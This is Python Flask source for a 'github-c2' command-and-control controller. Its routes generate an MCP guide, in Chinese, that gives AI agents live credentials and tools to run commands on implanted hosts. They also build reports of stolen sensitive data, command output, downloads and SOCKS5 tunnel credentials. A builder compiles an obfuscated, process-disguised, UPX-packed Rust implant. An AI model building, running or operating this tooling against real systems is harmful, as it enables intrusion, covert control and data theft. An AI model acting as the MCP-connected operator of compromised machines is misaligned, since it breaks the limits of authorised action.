def _read_version() -> dict:
    """Bundle stamp (version.txt) or live git rev. Used by /api/version + footer."""
    info = {
        "name": "github-c2",
        "version": "2.0.0",
        "rev": "unknown",
        "built_at": "",
        "files_sha256": "",
        "always_poll": os.environ.get("C2_ALWAYS_POLL") == "1",
    }
    p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "version.txt")
    if os.path.isfile(p):
        try:
            with open(p, encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith("#") or "=" not in line:
                        continue
                    k, v = line.split("=", 1)
                    if k == "rev":
                        info["rev"] = v
                    elif k == "date":
                        info["built_at"] = v
                    elif k == "files_sha256":
                        info["files_sha256"] = v
        except OSError:
            pass
    elif info["rev"] == "unknown":
        try:
            rev = _subprocess.check_output(
                ["git", "rev-parse", "--short", "HEAD"],
                cwd=os.path.dirname(os.path.abspath(__file__)),
                stderr=_subprocess.DEVNULL, timeout=3,
            ).decode().strip()
            if rev:
                info["rev"] = rev
        except Exception:
            pass
    return info


@app.route("/api/version")
@login_required
def api_version():
    return jsonify(_read_version())


@app.route("/api/mcp/guide")
@login_required
def api_mcp_guide():
    """Generate MCP onboarding artifacts with LIVE credentials for AI agents.

    Values come from runtime state / the operator's request host — nothing is
    hardcoded. Three artifacts: the standard MCP capability descriptor JSON,
    the mcpServers client-registration JSON, and a natural-language guide.
    """
    base = (request.host_url or "").rstrip("/")
    with _lock:
        user = _state.get("web_username", "")
        pwd  = _state.get("web_password", "")

    descriptor = _mcp_descriptor()
    descriptor_json = json.dumps(descriptor, ensure_ascii=False, indent=2)

    client_json = json.dumps({
        "mcpServers": {
            "github-c2": {
                "command": "python3",
                "args":    ["mcp_server.py"],
                "env": {
                    "C2_CTRL":      base,
                    "C2_WEB_USER":  user,
                    "C2_WEB_PASS":  pwd,
                },
            }
        }
    }, ensure_ascii=False, indent=2)

    tool_lines = "\n".join(
        f"- `{t['name']}`：{t['description'].split('.')[0]}"
        for t in descriptor["tools"]
    )
    guide_md = f"""# GitHub-C2 MCP 接入说明（FastMCP v2）

你可以通过 MCP（stdio JSON-RPC 2.0）操作一套红队实验 C2 控制台。严格按以下步骤接入：

## 1. 获取服务端脚本
在控制服务器上找到 `web-controller/mcp_server.py`，复制到你的运行目录
（或从控制台左侧栏「控制台工具 → 🤖 MCP 接入」页面直接下载）。
依赖：Python ≥ 3.8 + `requests`。

## 2. 环境变量（认证信息）
- `C2_CTRL` = `{base}`
- `C2_WEB_USER` = `{user}`
- `C2_WEB_PASS` = `{pwd}`

## 3. 以 stdio MCP server 方式启动（FastMCP，Content-Length 帧）
`python3 mcp_server.py` —— FastMCP 处理 MCP 协议（含 CyberStrikeAI 的 CommandTransport 兼容帧）。
工具集三档（`GITHUB_C2_MCP_TOOLS` 环境变量）：
- **handoff**（默认）：只有 `list_agents`（先 refresh，返回结构化 JSON）
- **core**：handoff + `run_command` / `get_output` / `sysinfo` / `stats` / `file_list` / `audit` / `tunnel_status`
- **full**：全部含 `upload_file` / `sensitive` / `killswitch`

控制器需设 `C2_ALWAYS_POLL=1`（浏览器关了后台也持续轮询，保活回显不中断）。

## 4. 服务器能力清单（标准 MCP 格式，{len(descriptor['tools'])} 个工具 · 档位 {descriptor.get('instructions', '').split('Toolset: ')[-1].split('.')[0] if 'Toolset:' in descriptor.get('instructions', '') else 'full'}）
{tool_lines}

完整的标准 MCP 能力 JSON（protocolVersion / capabilities / serverInfo /
每个工具的 inputSchema）：

```json
{descriptor_json}
```

## 5. 典型用法
1. `list_agents` 拿到 agent_id
2. `run_command`（agent_id + command，可选 wait_seconds）下发命令
3. `get_output`（agent_id，wait_seconds=30）读取回显
4. 命令经加密通道传输，Agent 轮询周期约 30s，请耐心等待输出

## 安全约束（必须遵守）
- 仅对授权实验室目标使用
- `killswitch` 会使所有 Agent 自毁（需 confirm=YES-DESTROY-ALL），非必要勿调用
- 凭据仅用于本控制器，勿写入代码仓库或日志
"""
    return jsonify({
        "descriptor_json": descriptor_json,
        "client_json":     client_json,
        "guide_md":        guide_md,
        "base_url":        base,
        "tools":           [{"name": t["name"], "desc": t["description"]}
                            for t in descriptor["tools"]],
    })


@app.route("/api/mcp/server_script")
@login_required
def api_mcp_server_script():
    """Serve mcp_server.py itself so AI-agent hosts can fetch it (login-gated)."""
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mcp_server.py")
    if not os.path.isfile(path):
        return jsonify({"error": "mcp_server.py not found"}), 404
    return send_file(path, as_attachment=True, download_name="mcp_server.py",
                     mimetype="text/x-python")


@app.route("/api/report/<agent_id>")
@login_required
def api_report(agent_id):
    fmt  = request.args.get("fmt", "json")   # json | md
    conn = _conn()

    ui_agents = _agents_for_ui(conn)
    agent = next((a for a in ui_agents
                  if a.get("id") == agent_id
                  or agent_id in (a.get("sibling_ids") or [])), None)
    if not agent:
        with _lock:
            agent = next((a for a in _state["agents"] if a["id"] == agent_id), None)

    ids        = _sibling_ids_for(agent_id)
    note       = _note_get_any(conn, agent_id)
    messages   = db.msg_list_many(conn, ids, limit=400)   # 防全量 PBKDF2 解密
    cmd_hist   = _cmd_list_any(conn, agent_id)
    si         = _si_latest_any(conn, agent_id)
    si_hist    = _si_history_any(conn, agent_id)
    sen        = _sen_latest_any(conn, agent_id)
    sen_hist   = _sen_history_any(conn, agent_id)

    # Downloaded files — absolute paths only, no content
    dl_files = []
    lib_dir  = _lib_dir(agent_id)
    lib_dirs = _lib_dirs(agent_id)
    if lib_dir not in lib_dirs:
        lib_dirs = [lib_dir] + lib_dirs
    notes_content = []
    seen_rel = set()

    try:
        for one_dir in lib_dirs:
            for root, dirs, fnames in os.walk(one_dir):
                rel_root = os.path.relpath(root, one_dir).replace("\\", "/")
                is_notes = rel_root == "notes" or rel_root.startswith("notes/")
                dirs.sort()
                for fname in sorted(fnames):
                    fpath = os.path.join(root, fname)
                    abs_p = os.path.abspath(fpath)
                    rel   = os.path.relpath(fpath, one_dir).replace("\\", "/")
                    if rel in seen_rel:
                        continue
                    seen_rel.add(rel)
                    size  = os.path.getsize(fpath)

                    if is_notes and fname.endswith(".md"):
                        # Notes: include content (written by operator for AI)
                        try:
                            content = open(fpath, encoding="utf-8", errors="replace").read().strip()
                            if content:
                                notes_content.append({
                                    "name":     fname,
                                    "path":     rel,
                                    "abs_path": abs_p,
                                    "content":  content,
                                })
                        except Exception:
                            pass
                    else:
                        # All other files: path + size only
                        dl_files.append({
                            "name":     fname,
                            "rel_path": rel,
                            "abs_path": abs_p,
                            "size":     size,
                            "modified": datetime.fromtimestamp(os.path.getmtime(fpath))
                                        .strftime("%Y-%m-%d %H:%M:%S"),
                        })
    except Exception:
        pass

    data = {
        "agent":               agent or {"id": agent_id},
        "note":                note,
        "sysinfo":             si,
        "sysinfo_snapshots":   len(si_hist),
        "sensitive":           sen,
        "sensitive_snapshots": len(sen_hist),
        "messages":            messages,
        "command_history":     cmd_hist,
        "downloaded_files":    dl_files,
        "operator_notes":      notes_content,
        "library_dir":         os.path.abspath(lib_dir),
        "generated_at":        datetime.now().isoformat(),
        "stowaway_socks":      _state.get("stowaway_socks", "1080"),
        "stowaway_socks_user": _state.get("stowaway_socks_user", "s5admin"),
        "stowaway_socks_pass": _state.get("stowaway_socks_pass", "123456"),
        "tunnel_ip":           _state.get("tunnel_ip", ""),
        "tunnel_listen_port":  _state.get("stowaway_listen", "9998"),
        "tunnel_server_running": _stowaway_running(),
        "tunnel_agent_active":   _detect_tunnel_active(messages),
        "tunnel_agent_last_ts":  _detect_tunnel_last_ts(messages),
    }

    if fmt == "md":
        md_text = _build_report_md(data)
        return Response(
            md_text, mimetype="text/markdown",
            headers={
                "Content-Disposition":
                    f'attachment; filename="report_{agent_id}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.md"'
            },
        )
    return jsonify(data)


def _fmt_size(n: int) -> str:
    if n < 1024:      return f"{n} B"
    if n < 1048576:   return f"{n/1024:.1f} KB"
    return f"{n/1048576:.1f} MB"


def _build_report_md(data: dict) -> str:
    a    = data["agent"]
    msgs = data["messages"]
    socks_port = data.get("stowaway_socks", "1080")
    tunnel_ip  = data.get("tunnel_ip", "") or "C2_SERVER"

    # ── Detect tunnel state (find the LATEST tunnel command) ────────────
    tunnel_active = False
    last_tunnel_ts = ""
    for m in reversed(msgs):
        if not m["is_command"]:
            continue
        c = m["content"]
        if c.startswith("tunnel:close"):
            tunnel_active = False
            last_tunnel_ts = m["timestamp"]
            break
        if c.startswith("tunnel "):
            tunnel_active = True
            last_tunnel_ts = m["timestamp"]
            break

    channel = a.get("channel", "github")
    channel_label = {"notion": "Notion", "worker": "Worker"}.get(channel, "GitHub")

    # Count commands
    cmd_count = sum(1 for m in msgs if m["is_command"])
    file_count = len(data["downloaded_files"])

    # ── Header ────────────────────────────────────────────────────────────
    lines = [
        f"# Agent Report: {a.get('hostname', 'unknown')}",
        f"> Generated: {data['generated_at']}",
        "",
    ]

    # ── SOCKS5 status — always first, prominent block ─────────────────────
    if tunnel_active:
        lines += [
            "",
            f"> 🟢 **SOCKS5 ACTIVE** — `{tunnel_ip}:{socks_port}` | user: `{data.get('stowaway_socks_user') or 's5admin'}` | pass: `{data.get('stowaway_socks_pass') or '123456'}`",
            f"> Traffic is being forwarded through target's internal network (since {last_tunnel_ts})",
            "",
        ]
    elif last_tunnel_ts:
        lines += [
            "",
            f"> 🔴 **SOCKS5 CLOSED** — stopped at {last_tunnel_ts}",
            "",
        ]
    else:
        lines += [
            "",
            "> ⚫ **SOCKS5: Not deployed**",
            "",
        ]

    # ── Agent info table ──────────────────────────────────────────────────
    lib_dir = data['library_dir']
    lines += [
        "",
        "## Agent",
        "",
        "| Field | Value |",
        "|---|---|",
        f"| ID | {a.get('id', '?')} |",
        f"| Hostname | {a.get('hostname','?')} |",
        f"| OS | {a.get('os','?')} |",
        f"| User | {a.get('username','?')} |",
        f"| Privilege | **{a.get('privilege','?')}** |",
        f"| Kernel | {a.get('kernel','?')} |",
        f"| Arch | {a.get('arch','?')} |",
        f"| Channel | {channel_label} ({a.get('repo', '?')}) |",
        f"| Last Seen | {a.get('last_seen','?')} |",
        f"| Commands Sent | {cmd_count} |",
        f"| Files Downloaded | {file_count} |",
        f"| Sysinfo | {'✓ collected' if data['sysinfo'] else '✗ not collected'} |",
        f"| Sensitive | {'✓ collected' if data['sensitive'] else '✗ not collected'} |",
        f"| Library | `{lib_dir}` |",
    ]
    if data["note"]:
        lines.append(f"| Note | {data['note']} |")

    lines += [
        "",
        f"> **Library** `{lib_dir}` — all downloaded files, scan results, and operator notes.",
        "> `notes/*.md` = operator notes (read first) · `scans/*.txt` = scan results · rest = downloaded files",
    ]

    # System Info
    lines += ["", "---", "", "## System Info", ""]
    if data["sysinfo"]:
        lines += [f"*Collected: {data['sysinfo']['collected_at']}*", "",
                  "```", data["sysinfo"]["content"], "```"]
    else:
        lines.append("*Not collected*")

    # Sensitive Info
    lines += ["", "---", "", "## Sensitive Information", ""]
    if data["sensitive"]:
        lines += [f"*Collected: {data['sensitive']['collected_at']}*", "",
                  "```", data["sensitive"]["content"], "```"]
    else:
        lines.append("*Not collected*")

    # Command History — pure history, newest first, capped
    lines += ["", "---", "", "## Command & Response History", ""]
    cmds   = {}
    for m in msgs:
        if m["is_command"] and m.get("command_id"):
            cmds[m["command_id"]] = {
                "cmd": m["content"], "ts": m["timestamp"], "resps": []
            }
        elif not m["is_command"] and m.get("response_to") in cmds:
            cmds[m["response_to"]]["resps"].append(m["content"])

    orphan_resps = [m for m in msgs if not m["is_command"] and m.get("response_to") not in cmds]

    MAX_CMDS_IN_REPORT = 50
    if cmds:
        sorted_cmds = sorted(cmds.values(), key=lambda x: x["ts"], reverse=True)
        shown = sorted_cmds[:MAX_CMDS_IN_REPORT]
        omitted = len(sorted_cmds) - len(shown)
        if omitted > 0:
            lines.append(f"*Showing latest {MAX_CMDS_IN_REPORT} of {len(sorted_cmds)} commands. "
                         f"Full history: `GET /api/messages/{a.get('id','?')}`*")
            lines.append("")
        for item in shown:
            lines += [f"### `{item['cmd']}`  *({item['ts']})*", ""]
            for resp in item["resps"]:
                if len(resp) > 4000:
                    resp = resp[:4000] + f"\n... (truncated, {len(resp)} chars total)"
                lines += ["```", resp, "```", ""]
    else:
        lines.append("*No commands recorded*")

    if orphan_resps:
        lines += ["", "### Other Messages", ""]
        for m in orphan_resps:
            lines += [f"*[{m['timestamp']}]*", "```", m["content"], "```", ""]

    # Downloaded Files — absolute paths only
    lines += ["", "---", "", "## Downloaded Files", ""]
    if data["downloaded_files"]:
        lines.append("| File | Absolute Path | Size | Date |")
        lines.append("|---|---|---|---|")
        for f in data["downloaded_files"]:
            lines.append(
                f"| {f['name']} | `{f['abs_path']}` | {_fmt_size(f['size'])} | {f['modified']} |"
            )
    else:
        lines.append("*No files downloaded yet*")

    # Operator Notes — short ones inline, long ones path-only
    lines += ["", "---", "", "## Operator Notes", ""]
    if data["operator_notes"]:
        NOTE_INLINE_LIMIT = 2000
        for n in data["operator_notes"]:
            if len(n["content"]) <= NOTE_INLINE_LIMIT:
                lines += [
                    f"### {n['name']}",
                    "",
                    n["content"],
                    "",
                ]
            else:
                lines += [
                    f"### {n['name']}",
                    f"*Content too long ({len(n['content'])} chars) — read directly: `{n['abs_path']}`*",
                    "",
                ]
    else:
        lines.append("*No notes*")

    lines += ["", "---", f"*End of report — {data['generated_at']}*"]
    return "\n".join(lines)


# (Platypus shell management removed — WS Shell replaces it)


# ── API: Agent Builder ─────────────────────────────────────────────────────────

# Builder state
_builder_lock = threading.Lock()
_builder_proc: "_subprocess.Popen | None" = None
_builder_started: float = 0.0
_builder_output: str = ""

@app.route("/api/builder/config", methods=["GET", "POST"])
@login_required
def api_builder_config():
    conn = _conn()
    if request.method == "GET":
        keys = ("builder_deploy_path", "builder_channel",
                "builder_token", "builder_repo",
                "builder_github_token", "builder_github_repo",
                "builder_notion_token", "builder_notion_repo",
                "builder_password", "builder_backup_url", "builder_poll_interval",
                "builder_time_window", "builder_debug",
                "builder_guard_hostname", "builder_guard_username",
                "builder_guard_file", "builder_guard_memory",
                "builder_worker_urls", "builder_worker_secret", "builder_worker_path",
                "builder_proc_name", "builder_proc_path",
                # 审计修复（bug#3）：此前 GET 白名单漏掉 builder_arch —— 保存的
                # 架构选择刷新后不回显，bldBuild 先 save 会用默认值把已存
                # aarch64 静默覆盖回 musl。新面板字段一并回显。
                "builder_arch", "builder_release",
                "builder_failover_threshold", "builder_probe_after_oks")
        cfg = {}
        for k in keys:
            v = db.cfg_get(conn, k)
            cfg[k] = v if v is not None else ""
        if not cfg["builder_deploy_path"]:
            cfg["builder_deploy_path"] = os.path.dirname(os.path.abspath(__file__))   # 含 agent/ 的目录（agent 源码在 web-controller/agent）
        if not cfg["builder_poll_interval"]:
            cfg["builder_poll_interval"] = "30"
        # failover 参数：空 = 内置默认（agent 侧 failover.rs 同值），UI 回显用
        if not cfg["builder_failover_threshold"]:
            cfg["builder_failover_threshold"] = "3"
        if not cfg["builder_probe_after_oks"]:
            cfg["builder_probe_after_oks"] = "5"
        cfg["builder_password_set"] = bool(
            (cfg.get("builder_password") or "").strip()
            or (_state.get("password") or "").strip())
        cfg["builder_worker_secret_set"] = bool((cfg.get("builder_worker_secret") or "").strip())
        cfg["builder_password"] = ""
        cfg["builder_worker_secret"] = ""
        for k in ("builder_token", "builder_github_token", "builder_notion_token"):
            cfg[k + "_set"] = bool((cfg.get(k) or "").strip())
            cfg[k] = ""
        return jsonify(cfg)
    data = request.json or {}
    for k, v in data.items():
        if not k.startswith("builder_"):
            continue
        val = "" if v is None else str(v)
        s = val.strip()
        if s == "-":
            db.cfg_set(conn, k, "")
        elif s:
            db.cfg_set(conn, k, val)
    synced = _sync_builder_github_into_settings(conn)
    return jsonify({"ok": True, "github_repo_synced": synced})


def _agent_build_version() -> str:
    """Build-time version stamp for 版本自上报 (项 9): explicit env AGENT_VERSION
    wins; otherwise the controller repo's short git revision; else 'unknown'."""
    v = os.environ.get("AGENT_VERSION", "").strip()
    if v:
        return v
    try:
        repo_dir = os.path.dirname(os.path.abspath(__file__))
        out = _subprocess.run(
            ["git", "-C", repo_dir, "rev-parse", "--short", "HEAD"],
            capture_output=True, text=True, timeout=5,
        )
        if out.returncode == 0 and out.stdout.strip():
            return "git-" + out.stdout.strip()
    except Exception:
        pass
    return "unknown"


def _resolve_builder_embed(conn):
    """编包渠道 + 通信 Secret + Worker 三件套。

    UI 四档：github / notion / worker / dual。
    dual 写入 Agent 的 channel_type 为 worker（主），并编入真实 GitHub
    token/repo 作为备用。github / notion 单通道不把库里残留的 Worker 凭据编进 Agent。
    编包密码空则沿用 Settings 通信 Secret。
    返回 (fields, None) 或 (None, (error, status)).
    """
    get = lambda k, d="": db.cfg_get(conn, k) or d
    ui_ch = (get("builder_channel", "github") or "github").strip() or "github"
    password = (get("builder_password") or "").strip() or (_state.get("password") or "").strip()
    w_urls = (get("builder_worker_urls") or "").strip() or (_state.get("worker_urls") or "").strip()
    w_secret = (get("builder_worker_secret") or "").strip() or (_state.get("worker_secret") or "").strip()
    w_path = (get("builder_worker_path") or "").strip() or (_state.get("worker_path") or "").strip()

    if ui_ch == "dual":
        # 双通道方向（架构调整）：Worker 主 + GitHub 备。
        # embed channel_type=worker：agent 侧 github_backup_ready() 看到
        # 真实 GitHub 凭据即启用备用（中继故障时降级 GitHub）。
        embed_ch = "worker"
        if not w_urls or not w_secret or not w_path:
            return None, ("双通道需要 Worker URL + Secret + Path（在 Builder 填一次即可，之后留空沿用）", 400)
    elif ui_ch == "github":
        embed_ch = "github"
        w_urls = w_secret = w_path = ""
    elif ui_ch == "notion":
        embed_ch = "notion"
        w_urls = w_secret = w_path = ""
    elif ui_ch == "worker":
        embed_ch = "worker"
        if not w_urls or not w_secret:
            return None, ("Worker 单通道需要 Relay URLs 和 Secret", 400)
        if not w_path:
            return None, ("Worker 单通道需要 Relay Path（Settings → Worker Path 或 ☁️ Worker 一键部署）", 400)
    else:
        return None, (f"未知渠道：{ui_ch}（github / notion / worker / dual）", 400)

    if not password:
        return None, ("通信加密 Secret 未设置。请在部署时填写，或到 Settings「控制器解密密码」设置一次。", 400)

    if ui_ch == "notion":
        token = (get("builder_notion_token") or "").strip()
        repo = (get("builder_notion_repo") or "").strip()
    elif ui_ch in ("github", "dual"):
        token = (get("builder_github_token") or get("builder_token") or "").strip()
        repo = (get("builder_github_repo") or get("builder_repo") or "").strip()
        if not token:
            raw = (_state.get("github_token") or "").strip()
            token = next((t.strip() for t in raw.split(",") if t.strip()), "")
        if not repo:
            repos = [r.strip() for r in (_state.get("github_repos") or []) if str(r).strip()]
            repo = repos[0] if repos else ""
    else:
        token = repo = ""

    # 双通道必须有真实的 GitHub 凭据（备用通道身份）——空/占位值会让
    # agent 侧退化成纯 worker 单通道，与操作者选「双通道」的意图不符。
    if ui_ch == "dual":
        if not token or not repo or "/" not in repo:
            return None, ("双通道（Worker 主 + GitHub 备）需要 GitHub Token 和 Repo (owner/repo) 作为备用凭据", 400)

    return {
        "embed_channel": embed_ch,
        "password": password,
        "w_urls": w_urls,
        "w_secret": w_secret,
        "w_path": w_path,
        "ui_channel": ui_ch,
        "token": token,
        "repo": repo,
    }, None


_EMBEDDED_CONFIG_PLACEHOLDER = (
    '// Auto-written by the generator — do not edit manually.\n'
    '// This file is overwritten on every deploy.sh run.\n'
    '//\n'
    '// All values are obfuscated with obfstr! at compile time.\n'
    '// deploy.sh must write values INSIDE the obfstr!() macro call.\n'
    '// Example:  pub fn github_token() -> String { obfstr::obfstr!("ghp_real_token").to_string() }\n'
    '\n'
    'pub fn channel_type() -> String { obfstr::obfstr!("github").to_string() }\n'
    'pub fn github_token() -> String { obfstr::obfstr!("").to_string() }\n'
    'pub fn github_repo() -> String { obfstr::obfstr!("").to_string() }\n'
    'pub fn encryption_password() -> String { obfstr::obfstr!("").to_string() }\n'
    'pub fn backup_url() -> String { obfstr::obfstr!("").to_string() }\n'
    'pub fn poll_interval() -> String { obfstr::obfstr!("").to_string() }\n'
    'pub fn time_window() -> String { obfstr::obfstr!("").to_string() }\n'
    'pub fn enable_debug() -> String { obfstr::obfstr!("0").to_string() }\n'
    '#[allow(dead_code)] pub fn guard_hostname() -> String { obfstr::obfstr!("").to_string() }\n'
    '#[allow(dead_code)] pub fn guard_username() -> String { obfstr::obfstr!("").to_string() }\n'
    '#[allow(dead_code)] pub fn guard_file_exists() -> String { obfstr::obfstr!("").to_string() }\n'
    '#[allow(dead_code)] pub fn guard_min_memory_mb() -> String { obfstr::obfstr!("").to_string() }\n'
    '/// Operator-defined disguise (empty = auto-pick by distro). Process name is\n'
    '/// the comm shown in ps/top (kernel truncates to 15 chars); path is where the\n'
    '/// relocated binary lives (absolute; must not be a running system binary).\n'
    '#[allow(dead_code)] pub fn proc_name() -> String { obfstr::obfstr!("").to_string() }\n'
    '#[allow(dead_code)] pub fn proc_path() -> String { obfstr::obfstr!("").to_string() }\n'
    '/// Worker relay config (empty = use runtime env only). The Builder fills\n'
    '/// these when channel=worker so the compiled binary is self-contained.\n'
    '#[allow(dead_code)] pub fn worker_urls() -> String { obfstr::obfstr!("").to_string() }\n'
    '#[allow(dead_code)] pub fn worker_secret() -> String { obfstr::obfstr!("").to_string() }\n'
    '#[allow(dead_code)] pub fn worker_path() -> String { obfstr::obfstr!("").to_string() }\n'
    '/// Build identity (项 9 版本自上报)：builder 注入版本/发布标识，空 = 未注入。\n'
    '#[allow(dead_code)] pub fn version() -> String { obfstr::obfstr!("").to_string() }\n'
    '#[allow(dead_code)] pub fn release_id() -> String { obfstr::obfstr!("").to_string() }\n'
    '/// 双通道故障切换参数（项 2 控制面板）：空/0 = 用 failover.rs 内置默认（3 / 5）。\n'
    '#[allow(dead_code)] pub fn failover_threshold() -> String { obfstr::obfstr!("").to_string() }\n'
    '#[allow(dead_code)] pub fn probe_after_oks() -> String { obfstr::obfstr!("").to_string() }\n'
)


def _restore_embedded_config_placeholder(config_path: str) -> None:
    """编包结束后把 embedded_config.rs 还原成空占位，避免 Secret 留在磁盘。"""
    try:
        with open(config_path, "w", encoding="utf-8") as f:
            f.write(_EMBEDDED_CONFIG_PLACEHOLDER)
    except Exception as e:
        debug_log(f"restore embedded_config placeholder: {e}")


@app.route("/api/builder/build", methods=["POST"])
@login_required
def api_builder_build():
    global _builder_proc, _builder_started, _builder_output
    with _builder_lock:
        if _builder_proc and _builder_proc.poll() is None:
            return jsonify({"error": "Build already in progress"}), 409

    conn = _conn()
    deploy_path = db.cfg_get(conn, "builder_deploy_path") or os.path.dirname(os.path.abspath(__file__))   # 含 agent/ 的目录（agent 源码在 web-controller/agent）
    agent_src = os.path.join(deploy_path, "agent", "src")
    config_path = os.path.join(agent_src, "embedded_config.rs")

    if not os.path.isdir(agent_src):
        return jsonify({"error": f"Agent source not found: {agent_src}"
                                 f"（deploy_path 应指向包含 agent/ 的目录，默认 web-controller/）"}), 400

    # Read builder config
    get = lambda k, d="": db.cfg_get(conn, k) or d
    backup    = get("builder_backup_url")
    poll      = get("builder_poll_interval", "30")
    window    = get("builder_time_window")
    resolved, embed_err = _resolve_builder_embed(conn)
    if embed_err:
        return jsonify({"error": embed_err[0]}), embed_err[1]
    password  = resolved["password"]
    channel   = resolved["embed_channel"]
    w_urls    = resolved["w_urls"]
    w_secret  = resolved["w_secret"]
    w_path    = resolved["w_path"]
    token     = resolved.get("token") or ""
    repo      = resolved.get("repo") or ""
    debug     = get("builder_debug", "0")
    g_host    = get("builder_guard_hostname")
    g_user    = get("builder_guard_username")
    g_file    = get("builder_guard_file")
    g_mem     = get("builder_guard_memory")

    # 项 10（多架构）：builder_arch 为空时保持旧行为（musl 单架构）。
    arch      = (get("builder_arch") or "x86_64-unknown-linux-musl").strip()
    if not re.fullmatch(r"[A-Za-z0-9_-]+-unknown-linux-(musl|gnu)", arch):
        return jsonify({"error": f"Invalid builder architecture triple: {arch!r}"}), 400

    # 项 2（双通道 failover）控制面板：切换阈值 / 主探测间隔（轮）。
    fo_th = (get("builder_failover_threshold") or "3").strip() or "3"
    fo_pr = (get("builder_probe_after_oks") or "5").strip() or "5"
    if not (fo_th.isdigit() and 2 <= int(fo_th) <= 10):
        return jsonify({"error": f"Invalid failover threshold (2-10): {fo_th!r}"}), 400
    if not (fo_pr.isdigit() and 2 <= int(fo_pr) <= 60):
        return jsonify({"error": f"Invalid probe interval (2-60): {fo_pr!r}"}), 400

    # 项 9 版本标识。审计修复（bug#4）：这两个值会拼进 bash -c 的单引号串
    # （AGENT_VERSION='..' RELEASE_ID='..'）——必须先过白名单字符集，否则
    # 一个带单引号的 release 值即可注入任意 shell。
    _ID_RE = r"[A-Za-z0-9._:+\- ]{1,64}"
    build_version = _agent_build_version()
    if not re.fullmatch(_ID_RE, build_version):
        build_version = "unknown"
    release_id = (get("builder_release") or "").strip() or build_version
    if not re.fullmatch(_ID_RE, release_id):
        return jsonify({"error": "Invalid release id (allowed: letters, digits, . _ : + - space; max 64)"}), 400

    # Deploy path is operator input that feeds several file writes below —
    # normalize and refuse traversal (must stay an absolute server path).
    dp_raw = get("builder_deploy_path") or deploy_path
    dp_norm = os.path.normpath(dp_raw)
    if not os.path.isabs(dp_norm) or ".." in dp_norm.split(os.sep)             or not re.fullmatch(r"[A-Za-z0-9._/\\:\-]+", dp_norm):
        return jsonify({"error": "Invalid deploy path (absolute, no .. , no shell metacharacters)"}), 400
    deploy_path = dp_norm

    # 仅 Worker 单通道才用 unused 占位。dual 的 embed_channel 也是 worker，
    # 但必须编入真实 GitHub 备用凭据——不能在这里盖掉。
    if (resolved.get("ui_channel") or "") == "worker":
        token = token.strip() or "unused"
        repo = repo.strip() or "unused"
    if not token or not repo:
        return jsonify({"error": "Token and Repo are required"}), 400

    # Write embedded_config.rs — CHANNEL_TYPE determines GitHub vs Notion routing.
    # For GitHub: GITHUB_TOKEN = PAT, GITHUB_REPO = owner/repo
    # For Notion: GITHUB_TOKEN = Integration token (ntn_xxx), GITHUB_REPO = database_id
    # Field names kept as GITHUB_TOKEN/GITHUB_REPO for backward compatibility;
    # CHANNEL_TYPE tells the agent how to interpret them.
    def rust_str(s: str) -> str:
        """Produce a Rust string literal with proper escaping: "value" """
        escaped = s.replace('\\', '\\\\').replace('"', '\\"')
        return f'"{escaped}"'

    # Function-style obfstr accessors — must match the format the agent consumes
    # (crate::embedded_config::github_token() etc., see agent/src/main.rs and guards.rs).
    def fn_line(name: str, value: str) -> str:
        return f'pub fn {name}() -> String {{ obfstr::obfstr!({rust_str(value)}).to_string() }}\n'

    config_content = (
        '// Auto-generated by web builder\n'
        + fn_line("channel_type", channel)
        + fn_line("github_token", token)
        + fn_line("github_repo", repo)
        + fn_line("encryption_password", password)
        + fn_line("backup_url", backup)
        + fn_line("poll_interval", poll)
        + fn_line("time_window", window)
        + fn_line("enable_debug", debug)
        + '#[allow(dead_code)] ' + fn_line("guard_hostname", g_host)
        + '#[allow(dead_code)] ' + fn_line("guard_username", g_user)
        + '#[allow(dead_code)] ' + fn_line("guard_file_exists", g_file)
        + '#[allow(dead_code)] ' + fn_line("guard_min_memory_mb", g_mem)
        + '#[allow(dead_code)] ' + fn_line("proc_name", get("builder_proc_name"))
        + '#[allow(dead_code)] ' + fn_line("proc_path", get("builder_proc_path"))
        + '#[allow(dead_code)] ' + fn_line("worker_urls", w_urls)
        + '#[allow(dead_code)] ' + fn_line("worker_secret", w_secret)
        + '#[allow(dead_code)] ' + fn_line("worker_path", w_path)
        + fn_line("version", build_version)
        + fn_line("release_id", release_id)
        + '#[allow(dead_code)] ' + fn_line("failover_threshold", fo_th)
        + '#[allow(dead_code)] ' + fn_line("probe_after_oks", fo_pr)
    )
    try:
        with open(config_path, "w") as f:
            f.write(config_content)
    except Exception as e:
        return jsonify({"error": f"Failed to write config: {e}"}), 500

    # Clear .fingerprint cache to force full recompilation
    fp_dir = os.path.join(deploy_path, "agent", "target",
                          arch, "release", ".fingerprint")
    if os.path.isdir(fp_dir):
        import shutil
        shutil.rmtree(fp_dir, ignore_errors=True)

    # Source cargo env if available
    cargo_env = ""
    cargo_env_file = os.path.expanduser("~/.cargo/env")
    if os.path.isfile(cargo_env_file):
        cargo_env = f". {cargo_env_file} && "

    # Compression option: strip (always safe) + upx (optional, user-controlled)
    compress = (request.json or {}).get("compress", False)

    bin_path = os.path.join(
        deploy_path, "agent", "target",
        arch, "release", "github-c2-agent"
    )

    # Build pipeline: cargo build → strip → optional upx
    # Each stage echoes a [stage] marker so the frontend can show progress.
    post_build = (
        f"echo '[stage] stripping debug symbols...' && "
        f"strip {bin_path} 2>&1 && "
        f"echo '[strip] done — '$(du -sh {bin_path} | cut -f1)"
    )
    if compress:
        post_build += (
            f" && if command -v upx >/dev/null 2>&1; then "
            f"echo '[stage] compressing with UPX...' && "
            f"upx --best --lzma -q {bin_path} 2>&1 && "
            f"echo '[upx] done — '$(du -sh {bin_path} | cut -f1); "
            f"else echo '[upx] not installed, skipping (apt install upx)'; fi"
        )
    post_build += f" && echo '[build] complete'"

    build_cmd = (
        f"{cargo_env}cd {deploy_path}/agent && "
        f"echo '[stage] adding rust target (rustup, best-effort)...' && "
        f"rustup target add {arch} 2>/dev/null || true && "
        f"echo '[stage] compiling (cargo build)...' && "
        f"AGENT_VERSION='{build_version}' RELEASE_ID='{release_id}' "
        f"cargo build --bin github-c2-agent "
        f"--target {arch} --release 2>&1 && "
        f"{post_build}"
    )

    def _run_build():
        global _builder_proc, _builder_output
        try:
            proc = _subprocess.Popen(
                ["bash", "-c", build_cmd],
                stdout=_subprocess.PIPE,
                stderr=_subprocess.STDOUT,
                cwd=os.path.join(deploy_path, "agent"),
            )
            with _builder_lock:
                _builder_proc = proc

